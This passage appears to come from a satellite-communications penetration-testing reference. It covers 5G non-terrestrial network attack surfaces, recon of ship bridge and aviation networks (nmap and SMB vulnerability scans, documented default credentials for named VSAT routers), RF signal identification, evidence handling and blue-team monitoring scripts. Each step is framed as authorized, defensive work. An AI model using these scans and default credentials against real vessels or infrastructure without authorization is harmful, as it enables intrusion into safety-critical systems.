tshark -r ntn_capture.pcap -Y 'nas-5gs' -V 2>&1 | head -50
# Look for:
#   - NTN-specific Information Elements (e.g., Satellite Info, Common TA)
#   - Pre-compensation of timing advance
#   - Doppler shift compensation
```

### 14.3 NTN Attack Surface (reference)

```text
1. Timing advance abuse: NTN requires large TA (up to 1 ms for GEO); a malicious UE could manipulate TA to desync.
2. Doppler compensation spoofing: The NTN gNB announces Doppler shift to UEs; a fake NTN gNB could spoof the Doppler to mislead UEs.
3. Beam handover manipulation: LEO NTN requires frequent beam handover (every ~10 minutes); handover manipulation could disrupt service.
4. Gateway failure: The NTN gateway earth station is a single point of failure.
```

### 14.4 NTN Testing with UERANSIM

```bash
# Use UERANSIM with NTN extensions (community fork)
git clone https://github.com/aligungr/UERANSIM.git
cd UERANSIM && make
# Configure NTN mode (custom config)
# Set satellite altitude, TA, Doppler
# Run against an Open5GS core
./nr-gnb -c ntn-config.yaml &
./nr-ue -c ue-config.yaml &
```

---

## 15. Maritime / Aviation Satellite — Bridge Network Pentest

Maritime and aviation satellite terminals have two attack surfaces: (a) the satellite link (RF), and (b) the on-board bridge network (IT/OT). The bridge network includes ECDIS (Electronic Chart Display), AIS transponder, radar, and the satcom router. The 2018 CyberKeel report documented VSAT terminals on merchant ships with default credentials and exposed management interfaces.

### 15.1 Maritime Bridge Network Recon

```bash
# Authorized engagement: enumerate the bridge network
nmap -sV -p 23,80,443,161,502,9100 192.168.1.0/24
# Typical bridge devices:
#   - ECDIS (chart display): port 80/443, often Windows XP/7 based
#   - AIS transponder: port 161 (SNMP) or proprietary UDP
#   - Radar: proprietary protocol on port 9100 or similar
#   - Satcom router (Cobham Sailor, Intellian, JRC): port 80/443, 23
#   - VDR (Voyage Data Recorder): port 22/80
```

### 15.2 ECDIS Vulnerability Scan

```bash
# Authorized engagement: ECDIS vulnerability scan
# ECDIS systems are often legacy Windows, rarely patched
nmap --script smb-vuln* -p 445 192.168.1.20
# Document findings:
#   - EOL Windows (XP, 7)
#   - Missing patches (MS17-010 EternalBlue, MS08-067 Conficker)
#   - Default credentials (admin/admin)
#   - Exposed RDP (3389) — known ransomware vector
```

### 15.3 AIS Transponder Verification

```bash
# Authorized engagement: verify AIS configuration
snmpwalk -v2c -c public 192.168.1.30 system | head
# Verify MMSI (Maritime Mobile Service Identity) is correct
# Verify static data (vessel name, call sign, dimensions) matches the ship's registration
# Look for AIS spoofing vulnerabilities (e.g., accepts spoofed position input from NMEA0183)
```

### 15.4 Satcom Router Hardening Check

```bash
# Cobham Sailor 800/900 VSAT router
nmap -sV -p 23,80,443,161 192.168.1.10
# Default credentials (documented): admin / admin
# Verify: credentials rotated? Firmware current? HTTPS enforced?
# Intellian v100 / v110
nmap -sV -p 23,80,443 192.168.1.11
# Default credentials: admin / 1234
```

### 15.5 Aviation IFEC (In-Flight Entertainment & Connectivity)

```bash
# Aviation satellite terminal (authorized engagement)
# Iridium Certus aviation terminals (Collins)
nmap -sV -p 23,80,443,161 192.168.1.0/24
# IFEC systems on commercial aircraft:
#   - Panasonic Avionics, Thales, Gogo, Viasat
#   - Passenger WiFi (separate from aircraft control)
#   - Aircraft control domain (ARINC 429, AFDX) — strictly segregated
```

---

## 16. Satellite Signal Identification & Unknown RF

### 16.1 Identifying Unknown Satellite Carriers

```bash
# Use the frequency and bandwidth to identify an unknown carrier
# Step 1: Capture the carrier
rtl_power -f 1100M:1200M:0.1M -g 40 -i 10s -e 60s unknown_carrier.csv
heatmap.py unknown_carrier.csv unknown_carrier.png
# Step 2: Identify the carrier's bandwidth
#   - 27 MHz: DVB-S/S2 (single transponder)
#   - 36 MHz: DVB-S/S2 (NTSC-era transponder)
#   - 72 MHz: DVB-S2 wide transponder
#   - 250 kHz: Iridium L-band burst (1.6 GHz)
#   - 200 kHz: Inmarsat BGAN (1.5 GHz)
# Step 3: Demodulate with the appropriate tool
```

### 16.2 Using Universal Radio Hacker (URH)

```bash
# URH is ideal for unknown / proprietary satellite signals
# Step 1: Capture the signal
rtl_sdr -f 1620000000 -s 1000000 -g 40 -n 10000000 unknown.iq
# Step 2: Open in URH
urh &
# Step 3: In URH:
#   - Load the IQ file
#   - Identify the modulation (ASK, FSK, PSK, etc.)
#   - Identify the framing (preamble, sync word, payload)
#   - Build a decoder
# Step 4: Apply the decoder to other captures
```

### 16.3 Identifying Satellite ID from Beacon

```bash
# GEO satellites transmit a C-band or Ku-band beacon (tracking telemetry)
# The beacon frequency uniquely identifies the satellite
# Reference: https://www.lyngsat.com/beacons.html
# Example: Intelsat 901 beacon at 3700.5 MHz (C-band)
# Example: Eutelsat 7A beacon at 11450.5 MHz (Ku-band)

# Capture and measure beacon frequency
rtl_power -f 11445M:11460M:0.01M -g 40 -i 60s -e 600s beacon.csv
# Find the peak in the spectrogram
python3 -c "
import csv
peaks = []
for row in csv.reader(open('beacon.csv')):
    freq_start, freq_step, samples = float(row[2]), float(row[3]), int(row[4])
    power = [float(p) for p in row[6:]]
    max_p = max(power)
    max_idx = power.index(max_p)
    freq = freq_start + max_idx * freq_step
    if max_p > -50:
        peaks.append((freq, max_p))
peaks.sort(key=lambda x: x[1], reverse=True)
for f, p in peaks[:5]:
    print(f'{f/1e6:.3f} MHz: {p:.1f} dB')
"
```

---

## 17. Cross-Skill Coordination

### 17.1 Satellite + Cellular (5G NTN)

When a satellite terminal backhauls a remote 5G cell (common in rural broadband), the attack surface spans both `satellite-leo-security` and `5g-telecom-attack`.

```bash
# Authorized engagement: a remote cell with Starlink backhaul
# Identify the satellite terminal
grpcurl -plaintext -import-path . -proto device.proto 192.168.100.1:9200 list
# Identify the 5G gNodeB on the same network
nmap -sV -p 38412,36412,2152 192.168.1.0/24
# Test the 5G core (sba) — see 5g-telecom-attack payloads.md
```

### 17.2 Satellite + Aviation/Maritime (Aireon ADS-B)

Aireon hosts ADS-B receivers on Iridium NEXT satellites, providing global aircraft tracking. The ADS-B uplink (1090 MHz from aircraft) is the same band covered by `hf-vhf-radio-attack`.

```bash
# Receive ADS-B at 1090 MHz (terrestrial — see hf-vhf-radio-attack)
dump1090 --net --interactive &
# The aircraft's position is also relayed via Iridium to Aireon
# Aireon data is not receivable by commodity SDRs
```

### 17.3 Satellite + SCADA (Wind Turbines, Pipelines)

Satellite terminals frequently backhaul SCADA for remote infrastructure. The Viasat 2022 incident disabled 5,800 Enercon wind-turbine modems in Germany.

```bash
# Authorized engagement: a wind-turbine farm with VSAT backhaul
# Identify the SCADA protocol (Modbus, DNP3, IEC 60870-5-104)
nmap -sV -p 502,20000,2404 192.168.1.0/24
# See scada-ics-security payloads.md for protocol-specific testing
```

---

## 18. Evidence Handling

### 18.1 IQ Capture Preservation

```bash
# Hash every IQ capture on engagement
sha256sum *.iq >> captures.sha256
sha256sum *.pcap >> captures.sha256
# Preserve original captures; never modify
# Working copies: copy to a working directory
mkdir -p work && cp *.iq work/
# All analysis is on the working copies
```

### 18.2 Spectrogram Generation

```bash
# Generate spectrograms for every capture
for f in *.iq; do
    # HackRF IQ is 8-bit signed I/Q interleaved
    # Convert to a spectrogram (use baudline, SDR#, or a custom script)
    python3 -c "
import numpy as np
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
raw = np.fromfile('$f', dtype=np.int8)
iq = raw[0::2] + 1j * raw[1::2]
fig, ax = plt.subplots(figsize=(12, 6))
ax.specgram(iq, Fs=2e6, NFFT=1024, noverlap=512)
ax.set_xlabel('Time (s)')
ax.set_ylabel('Frequency (MHz, relative)')
ax.set_title('$f')
plt.tight_layout()
plt.savefig('${f%.iq}.png', dpi=120)
print('Saved ${f%.iq}.png')
"
done
```

### 18.3 Firmware Preservation

```bash
# Preserve extracted firmware
mkdir -p firmware_evidence
mv *.bin firmware_evidence/
sha256sum firmware_evidence/*.bin > firmware_evidence/hashes.txt
# Document extraction metadata
cat > firmware_evidence/extraction_log.txt <<EOF
Date: $(date -Iseconds)
Operator: <engagement operator>
Terminal: <terminal model and serial>
Method: SPI flash read via CH341A programmer (3.3V)
Tool: flashrom -p ch341a_spi
Authorization: <engagement authorization reference>
EOF
```

### 18.4 Engagement Report Hashing

```bash
# Hash the final engagement report
sha256sum engagement_report.pdf >> report.sha256
# Store the report hash with the evidence
mv engagement_report.pdf engagement_evidence/
# Sign the evidence set (optional)
gpg --detach-sig engagement_evidence/engagement_report.pdf
```

---

## 19. Defensive Monitoring (Blue Team)

### 19.1 Satellite Downlink Monitoring

```bash
# Continuous spectrum monitoring at the terminal location
rtl_power -f 11700M:12200M:0.5M -i 60s -e 86400s ku_band_$(date +%Y%m%d).csv &
# Daily review of spectrograms for anomalies
heatmap.py ku_band_$(date +%Y%m%d).csv ku_band_$(date +%Y%m%d).png
# Look for:
#   - Unexpected carriers (potential jamming)
#   - Carrier power drops (rain fade, antenna mis-point)
#   - Carrier frequency shifts (LNB drift)
```

### 19.2 GPS Anomaly Detection

```bash
# Monitor a GPS-disciplined oscillator for anomalies
# (typical setup: u-blox Z9-F9P + GPSDO)
# Log position and time continuously
python3 -c "
import serial, time
with serial.Serial('/dev/ttyACM0', 9600, timeout=1) as s:
    while True:
        line = s.readline().decode('ascii', errors='ignore')
        if line.startswith('\$GPGGA') or line.startswith('\$GNGGA'):
            ts = time.time()
            with open(f'gps_{time.strftime(\"%Y%m%d\")}.log', 'a') as f:
                f.write(f'{ts} {line}')
" &
# Daily review for position jumps > 100m (anomaly)
python3 -c "
import re
from datetime import datetime
positions = []
with open('gps_$(date +%Y%m%d).log') as f:
    for line in f:
        m = re.search(r'\\\$G[PN]GGA,(\\d+\\.\\d+),(\\d+\\.\\d+),([NS]),(\\d+\\.\\d+),([EW])', line)
        if m:
            positions.append((float(m.group(2)), float(m.group(4))))
# Compute jumps
for i in range(1, len(positions)):
    dlat = positions[i][0] - positions[i-1][0]
    dlon = positions[i][1] - positions[i-1][1]
    if abs(dlat) > 0.001 or abs(dlon) > 0.001:
        print(f'Position jump at sample {i}: {dlat:.6f} {dlon:.6f}')
"
```

### 19.3 Fleet Monitoring SIEM Ingest

```bash
# Ingest terminal status into a SIEM (e.g., Splunk)
# Set up a forwarder on a management workstation that polls all terminals
cat > /opt/starlink_fleet_forwarder.sh <<'BASH'
#!/bin/bash
for ip in $(cat /opt/terminal_ips.txt); do
    status=$(grpcurl -plaintext -import-path /root/starlink \
      -proto spacex/api/device/device.proto \
      -d '{"get_status":{}}' \
      ${ip}:9200 SpaceX.API.Device.Device/Handle 2>/dev/null)
    echo "{\"ts\":\"$(date -Iseconds)\",\"ip\":\"${ip}\",\"status\":${status}}" \
        | /opt/splunkforwarder/bin/splunk add oneshot /dev/stdin -sourcetype starlink_status
done
BASH
chmod +x /opt/starlink_fleet_forwarder.sh
# Run every 5 minutes
(crontab -l ; echo '*/5 * * * * /opt/starlink_fleet_forwarder.sh') | crontab -
```

### 19.4 Firmware Integrity Attestation

```bash
# On each terminal, attest the firmware hash to a central collector
# Starlink: query the firmware version via gRPC; verify against expected versions
expected_versions=( "1.0.0" "1.1.0" "1.2.0" )
for ip in $(cat /opt/terminal_ips.txt); do
    ver=$(grpcurl -plaintext -import-path /root/starlink \
      -proto spacex/api/device/device.proto \
      -d '{"get_status":{}}' \
      ${ip}:9200 SpaceX.API.Device.Device/Handle 2>/dev/null \
      | python3 -c "import json,sys; print(json.load(sys.stdin).get('get_status',{}).get('deviceInfo',{}).get('softwareVersion',''))")
    if [[ ! " ${expected_versions[@]} " =~ " ${ver} " ]]; then
        echo "ALERT: Terminal ${ip} has unexpected firmware version: ${ver}"
    fi
done
```

---

## 20. Operational Safety Checklist

```text
=== PRE-ENGAGEMENT ===
[ ] Written rules of engagement (RoE) signed by operator + terminal owner
[ ] Frequency authorization confirmed (if TX-side work)
[ ] Faraday cage authorization (for GNSS spoofing)
[ ] Engagement window identified (off-business-hours for active terminals)
[ ] Lab equipment verified (SDR, LNB, antennas, CH341A)
[ ] Legal review completed (CA card, customer data interception)

=== DURING ENGAGEMENT ===
[ ] All TX-side work confined to authorized Faraday cage
[ ] All captures hashed and timestamped on completion
[ ] All captures stored in the engagement vault
[ ] No conditional-access (DVB-CSA) descrambling without CA card
[ ] No customer data interception outside scope
[ ] Continuous logging of all commands (typescript)

=== POST-ENGAGEMENT ===
[ ] All evidence hashed and stored
[ ] Engagement report finalized
[ ] Findings cross-referenced to MITRE ATT&CK
[ ] Defense recommendations provided per finding
[ ] Operator notified of any critical findings immediately
[ ] Engagement closure meeting scheduled
```

---

## References

- ETSI EN 300 421 — DVB-S (QPSK)
- ETSI EN 301 790 — DVB-RCS (return channel)
- ETSI TS 101 545 — DVB-RCS2 (with security)
- ETSI EN 302 307 — DVB-S2
- ETSI EN 302 307-2 — DVB-S2X
- ETSI TS 102 606 — GSE (Generic Stream Encapsulation)
- ETSI TS 100 289 — DVB-CSA (Common Scrambling Algorithm)
- ICD-GPS-200C — GPS L1 C/A signal spec
- OS SIS ICD — Galileo Open Service Signal-in-Space Interface Control Document
- SentinelLabs (Mar 2022) — AcidRain analysis (Viasat KA-SAT wiper)
- C4ADS (2019) — Above Us Only Stars (GPS spoofing of vessels)
- ENISA — Threat Landscape for Satellite Communications
- 3GPP TS 22.261 — Service requirements for 5G (covers satellite integration in 5G NTN)
